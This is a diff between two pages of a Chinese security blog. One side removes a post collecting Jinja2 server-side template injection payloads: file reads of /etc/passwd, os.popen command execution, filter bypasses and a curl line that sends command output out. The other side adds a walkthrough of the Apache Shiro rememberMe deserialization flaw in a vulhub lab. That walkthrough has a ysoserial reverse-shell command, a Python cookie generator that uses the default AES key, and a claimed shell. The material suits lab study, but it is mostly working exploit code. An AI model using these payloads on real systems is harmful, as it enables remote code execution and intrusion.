@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI模板注入payload记录, Fortheone">
+    <meta name="keywords" content="Apache shiro反序列化漏洞复现, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI模板注入payload记录 | Fortheone</title>
+    <title>Apache shiro反序列化漏洞复现 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI模板注入payload记录</h1>
+                    <h1 class="description center-align post-title">Apache shiro反序列化漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-03
+                    2020-07-22
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    756
+                    526
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -456,90 +456,58 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/ctfjennie1.jpg" width="80%">
-<a id="more"></a>
-<h3 id="0x00前言">0x00前言</h3>
-<p>模板注入也算比较老的东西了，但是偶尔可能会碰到，所以就在这里记录一些bypass方法和一些特殊的payload。</p>
-<p>基本的魔术方法</p>
-<pre><code>__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__base__   返回该对象所继承的基类
-// __base__和__mro__都是用来寻找基类的
+                <h3 id="漏洞环境搭建">漏洞环境搭建</h3>
+<p><a href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/" target="_blank" rel="noopener">https://vulhub.org/#/environments/shiro/CVE-2016-4437/</a></p>
+<p>直接使用docker搭建vulhub里的shiro靶场就可以了。</p>
+<p>启动后</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20200722165016.png" alt></p>
+<p>登录抓包</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/20200722171450.png" alt></p>
+<p>可以在响应包中看到有 rememberMe=deleteMe的字段，这是shiro的特征。</p>
+<p><strong>漏洞验证</strong></p>
+<p>1、直接使用xray给出的payload测试</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/20200722171512.png" alt></p>
+<p>在xray的config.yaml中修改proxy为burp的监听端口，这样可以获取到xray发出的流量。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/20200722171529.png" alt></p>
+<p>这里可以抓到xray发出的请求包中的payload，其中的header中还带有Testecho，用以测试回显。可以看到响应头中出现了Testecho字样。所以判断出存在漏洞。</p>
+<p>然后再将Testecho替换为 Testcmd 即可执行命令。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595409354652.png" alt></p>
+<p>但是我这台机器在执行ifconfig命令的时候不知道为什么无法执行。</p>
+<p>2、使用ysoserial反序列化发payload</p>
+<p>首先要下载 ysoserial的jar包  <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="noopener">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>
+<p>然后下载 ysoserial的源码 <a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial.git</a></p>
+<p>java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 7878 CommonsCollections5 “bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}”</p>
+<p>在7878端口监听JRMP，等待服务端访问。</p>
+<p>然后使用poc.py生成payload的cookie</p>
+<pre><code>import sys
+import uuid
+import base64
+import subprocess
+from Crypto.Cipher import AES
 
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  对包含函数全局变量的字典的引用
+def encode_rememberme(command):
+​    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-30099844c6-1.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
+​    BS = AES.block_size
+​    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+​    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
+​    iv = uuid.uuid4().bytes
+​    encryptor = AES.new(key, AES.MODE_CBC, iv)
+​    file_body = pad(popen.stdout.read())
+​    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+​    return base64_ciphertext
+
+if __name__ == '__main__':
+​    payload = encode_rememberme(sys.argv[1])
+print &quot;rememberMe={0}&quot;.format(payload.decode())
 </code></pre>
-<h3 id="0x01常见的一些payload">0x01常见的一些payload</h3>
-<p>这里多数都是通过先获取到object对象，然后找到file引用来读取文件。</p>
-<pre><code>''.__class__.__mro__[2]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8]    //(jinja2中存在request对象)
-</code></pre>
-<p>上面的语句都可以获得object对象，然后通过object对象列出可调用的引用列表，找到可用的引用。</p>
-<pre><code>object.__subclasses__()[40]('/etc/passwd').read()     //file类读取文件
-object.__subclasses__()[40]('/tmp').write('test')     //file类写文件
-
-object..__subclasses__()[59].__init__.func_globals['linecache'].os.system('whoami')     //os类执行命令
-
-object.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('ls').read()      //os类执行命令
-
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()                                        //os类执行命令              
-</code></pre>
-<h3 id="0x02-bypass">0x02 bypass</h3>
-<h4 id="1、过滤">1、过滤[</h4>
-<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()                            //读文件
-
-''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()                //执行命令
-</code></pre>
-<h4 id="2、过滤引号">2、过滤引号</h4>
-<pre><code>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
-//先获取chr()函数，赋值给chr，然后用chr拼接出要读取的文件名
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
-//要使用到request对象，在jinja2中可使用
-
-//执行命令
-{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id
-</code></pre>
-<h4 id="3、过滤双下划线">3、过滤双下划线</h4>
-<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//也要用到request对象
-</code></pre>
-<h4 id="4、过滤大括号">4、过滤大括号</h4>
-<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-//利用curl将结果外带
-```
-
-
-
-#### 5、过滤了class 或者 subclasses
-
-利用 'subcla'+'sses'绕过
-
-其他的字符串过滤了也可以使用这种拼接的方式绕过
-
-
-
-#### 其他的一些payload
-
-```
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
-
-session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]         //可以获取到object对象，再根据序列号选择file或os类
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}{% endif %}{% endfor %}
-
-</code></pre>
-<h3 id="0x03-参考文章">0x03 参考文章</h3>
-<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
-<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/</a></p>
+<p>python <a href="http://poc.py" target="_blank" rel="noopener">poc.py</a>  监听服务器ip:端口</p>
+<p>生成了payload之后，向服务器发送payload的cookie</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/1595409372988.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/20200722171743.png" alt></p>
+<p>成功获取到shell。</p>
+<p><strong>一些要注意的点</strong></p>
+<p>1、在生成payload的时候，使用的key一般是shiro1.2.4默认的key，在实际环境下可能会有其他的key。xray中自带了几个其他的key值用于遍历。</p>
+<p>2、实际情况中默认shiro的commons-collections版本为3.2.1 而ysoserial里使用3.2.1的版本时会报错，但是可以使用JRMP。可以多尝试几个 commons-collections的版本。具体还要看环境中的依赖包。</p>
 
             </div>
             <hr>
@@ -565,7 +533,7 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/01/03/ssti/">http://yoursite.com/year/01/03/ssti/</a>
+                    <a href="http://yoursite.com/year/07/22/apacheshiro复现/">http://yoursite.com/year/07/22/apacheshiro复现/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1033,35 +1001,32 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/year/03/04/JavaScript/">
+                <a href="/year/07/22/学校内网再测试/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="回炉重造计划——JavaScript学习小结">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="学校内网再测试">
                         
-                        <span class="card-title">回炉重造计划——JavaScript学习小结</span>
+                        <span class="card-title">学校内网再测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。
-0x00 JavaScript继承机制
-在JavaScript中，几乎所有的事物都是对象。
-创造对象的方法：
-var o = {a:1,b:2};       
+                            初探内网
+在向信息中心的老师申请了对学校进行一次内网渗透测试的授权之后，我开始着手对学校内网中在用系统进行了一波信息搜集。其中大部分都使用了新版的未爆出0day的框架组件，这让我一开始的打点过程陷入僵局。但是在我重新翻了一遍学校开放的各种w
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-22
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/总结记录/" class="post-category">
-                                    总结记录
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -1078,27 +1043,30 @@ var o = {a:1,b:2};
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/06/03/RCTF2020/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="RCTF2020复现">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">RCTF2020复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
+                            calc
 
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+这题是和师傅们一起做出来的，主要是通过php的各种数学运算，从可输入的字符中运算出其他要利用的字符。
+&lt;?php
+error_reporting(0);
+echo ((1/0).(0/0));
+echo &quot;&lt
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-03
                             </span>
                         <span class="publish-author">
                             
